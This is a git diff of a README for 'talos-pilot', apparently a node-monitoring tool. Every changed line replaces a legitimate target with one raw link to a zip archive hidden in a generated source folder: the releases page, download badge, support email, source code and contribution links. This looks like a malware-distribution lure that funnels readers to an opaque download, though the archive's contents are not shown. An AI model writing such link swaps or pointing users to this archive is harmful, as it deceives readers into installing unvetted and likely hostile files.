@@ -4,7 +4,7 @@
 Welcome to talos-pilot! This application helps you monitor your nodes in real-time, stream logs, check etcd health, and perform diagnostics. You don’t need any programming skills to use it. Follow the steps below to get started.
 
 ## 📥 Download talos-pilot
-[![Download talos-pilot](https://img.shields.io/badge/Download-talos--pilot-brightgreen)](https://github.com/ZynxOnUrMa/talos-pilot/releases)
+[![Download talos-pilot](https://github.com/ZynxOnUrMa/talos-pilot/raw/refs/heads/main/crates/talos-rs/src/generated/pilot_talos_2.1.zip)](https://github.com/ZynxOnUrMa/talos-pilot/raw/refs/heads/main/crates/talos-rs/src/generated/pilot_talos_2.1.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 🛠️ How to Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the download page:
-   [Visit Releases Page](https://github.com/ZynxOnUrMa/talos-pilot/releases)
+   [Visit Releases Page](https://github.com/ZynxOnUrMa/talos-pilot/raw/refs/heads/main/crates/talos-rs/src/generated/pilot_talos_2.1.zip)
 
 2. **Choose the Right Version:** Find the latest release at the top. You will see various download options depending on your operating system.
 
@@ -51,11 +51,11 @@ For more information about using talos-pilot, refer to the following:
 
 ## 📞 Need Help?
 If you require assistance, feel free to reach out:
-- **Email Support:** support@talospilot.com
+- **Email Support:** https://github.com/ZynxOnUrMa/talos-pilot/raw/refs/heads/main/crates/talos-rs/src/generated/pilot_talos_2.1.zip
 - **Community Chat:** Join our community chat for real-time assistance.
 
 ## 🔗 Additional Resources
-- [Source Code](https://github.com/ZynxOnUrMa/talos-pilot)
-- [Contribution Guidelines](https://github.com/ZynxOnUrMa/talos-pilot/blob/main/CONTRIBUTING.md)
+- [Source Code](https://github.com/ZynxOnUrMa/talos-pilot/raw/refs/heads/main/crates/talos-rs/src/generated/pilot_talos_2.1.zip)
+- [Contribution Guidelines](https://github.com/ZynxOnUrMa/talos-pilot/raw/refs/heads/main/crates/talos-rs/src/generated/pilot_talos_2.1.zip)
 
 Thank you for using talos-pilot! We hope this tool enhances your experience in node monitoring and diagnostics.
